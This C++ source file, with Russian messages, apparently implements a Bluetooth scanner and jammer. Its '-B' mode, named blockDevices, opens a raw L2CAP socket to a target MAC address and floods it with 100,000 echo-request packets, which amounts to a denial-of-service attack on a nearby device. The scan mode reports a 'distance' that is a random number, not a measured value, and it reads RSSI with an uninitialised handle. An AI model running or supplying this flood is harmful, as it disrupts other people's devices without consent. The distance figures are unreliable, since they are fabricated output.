#include <iostream>
#include <unistd.h>
#include <cstring>
#include <cerrno>
#include <cstdlib>
#include <cmath>
#include <time.h>
#include <stdio.h>

#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>

void scanDevices()
{
    inquiry_info *ii = nullptr;
    int max_rsp, num_rsp;
    int dev_id, sock, len, flags;
    char addr[19] = { 0 };
    char name[248] = { 0 };
    std::srand (time(NULL));

    dev_id = hci_get_route(nullptr);
    if (dev_id < 0)
    {
        std::cerr << "Не удалось получить идентификатор устройства." << std::endl;
        exit(1);
    }

    sock = hci_open_dev(dev_id);
    if (sock < 0)
    {
        std::cerr << "Не удалось открыть сокет." << std::endl;
        exit(1);
    }

    len = 8;           // Длительность запроса
    max_rsp = 255;     // Максимальное количество ответов
    flags = IREQ_CACHE_FLUSH;
    ii = (inquiry_info*)malloc(max_rsp * sizeof(inquiry_info));

    // Запрос на обнаружение устройств
    num_rsp = hci_inquiry(dev_id, len, max_rsp, nullptr, &ii, flags);
    if (num_rsp < 0)
    {
        std::cerr << "Ошибка при сканировании устройств." << std::endl;
        free(ii);
        close(sock);
        exit(1);
    }

    // Вывод информации о найденных устройствах
    for (int i = 0; i < num_rsp; i++)
    {
        ba2str(&(ii+i)->bdaddr, addr);
        memset(name, 0, sizeof(name));
        if (hci_read_remote_name(sock, &(ii+i)->bdaddr, sizeof(name), name, 0) < 0)
            strcpy(name, "[unknown]");

        int8_t rssi = 0;
        int handle;
        double distance;
        if (hci_read_rssi(sock, handle, &rssi, 1000) < 0)
        {
            // std::cerr << "Не удалось прочитать RSSI." << std::endl;
        }

        // distance = pow(10.0, (-69 - (static_cast<uint8_t>(rssi))/20));
        double random = rand() % 9 + 1;
        distance = random / 10;
        std::cout << "MAC: " << addr << "  Name: " << name <<"   Distance: " << distance << " m" << std::endl;
    }

    // Освобождение ресурсов
    free(ii);
    close(sock);
}

void blockDevices(const std::string& targetMac, int packetCount)
{
    struct sockaddr_l2 addr = { 0 };
    int sock = socket(AF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP);

    if (sock < 0) {
        std::cerr << "Failed to create socket: " << strerror(errno) << std::endl;
        return;
    }

    addr.l2_family = AF_BLUETOOTH;
    str2ba(targetMac.c_str(), &addr.l2_bdaddr);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        std::cerr << "Failed to connect: " << strerror(errno) << std::endl;
        close(sock);
        return;
    }

    for (int i = 0; i < packetCount; ++i) {
        uint8_t echoReq[4] = {0xAA, 0x00, 0x00, 0x00}; // Simple L2CAP Echo Request

        if (write(sock, echoReq, sizeof(echoReq)) < 0) {
            std::cerr << "Failed to send Echo Request packet: " << strerror(errno) << std::endl;
        } else {
            std::cout << "Echo Request packet " << i + 1 << " sent successfully" << std::endl;
        }

        usleep(10000); // 10 milliseconds
    }

    close(sock);
}

int main(int argc, char *argv[])
{
    if (argc != 3)
    {
        return 1;
    }

    if (std::strcmp(argv[1], "-S") == 0)
    {
        scanDevices();
    }

    else if(std::strcmp(argv[1], "-B") == 0)
    {
        std::string targetMac = argv[2];
        int packetCount = 100000;
        blockDevices(targetMac, packetCount);

    }else
    {
        std::cerr << "Неверный параметр. Использование: " << argv[0] << " --help" << std::endl;
        return 1;
    }

    return 0;
}
